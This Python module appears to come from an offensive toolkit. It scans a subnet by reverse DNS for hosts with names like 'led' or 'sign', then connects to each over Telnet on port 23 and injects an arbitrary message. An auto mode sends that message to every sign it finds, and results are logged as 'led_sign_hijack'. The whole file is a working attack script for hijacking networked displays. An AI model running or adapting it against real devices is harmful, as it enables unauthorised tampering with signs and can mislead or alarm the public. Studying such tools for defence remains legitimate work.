#!/usr/bin/env python3
# modules/attacks/iot_led_sign_controller.py

import os
import json
import socket
import time
import argparse
import threading
from datetime import datetime
from ipaddress import ip_network

LOG_FILE = "results/led_sign_hijack.json"
DISCOVERY_LOG = "results/led_sign_discovery.json"
MITRE_TTP = "T1565"
DEFAULT_PORT = 23
KNOWN_HOST_PATTERNS = ["led", "sign", "display", "marquee"]

def log_msg(ip, msg):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "message": msg,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def log_discovery(ip, hostname):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip,
        "hostname": hostname
    }
    with open(DISCOVERY_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")

def send_payload(ip, message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, DEFAULT_PORT))
        s.sendall(message.encode() + b'\n')
        time.sleep(1)
        s.close()
        log_msg(ip, message)
        print(f"[+] Injected message to LED sign at {ip}")
    except Exception as e:
        print(f"[-] Failed to send to {ip}: {e}")

def discover_led_signs(subnet, threads=50):
    found = []

    def worker(ip):
        try:
            hostname = socket.gethostbyaddr(str(ip))[0].lower()
            if any(pat in hostname for pat in KNOWN_HOST_PATTERNS):
                print(f"[+] Possible LED sign: {ip} ({hostname})")
                log_discovery(str(ip), hostname)
                found.append(str(ip))
        except:
            pass

    ip_range = list(ip_network(subnet).hosts())
    thread_list = []
    for ip in ip_range:
        t = threading.Thread(target=worker, args=(ip,))
        t.start()
        thread_list.append(t)
        if len(thread_list) >= threads:
            for tt in thread_list:
                tt.join()
            thread_list = []

    for tt in thread_list:
        tt.join()

    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack IoT LED signs over Telnet with custom messages")
    parser.add_argument("--ip", help="Target IP of LED sign")
    parser.add_argument("--msg", help="Message to inject")
    parser.add_argument("--scan", help="CIDR subnet to scan for LED signs (e.g., 192.168.1.0/24)")
    parser.add_argument("--auto", action="store_true", help="Auto-inject default message to discovered signs")

    args = parser.parse_args()

    if args.scan:
        targets = discover_led_signs(args.scan)
        if args.auto and args.msg:
            for tgt in targets:
                send_payload(tgt, args.msg)
    elif args.ip and args.msg:
        send_payload(args.ip, args.msg)
    else:
        print("[-] Must provide --ip and --msg or --scan with --auto and --msg")
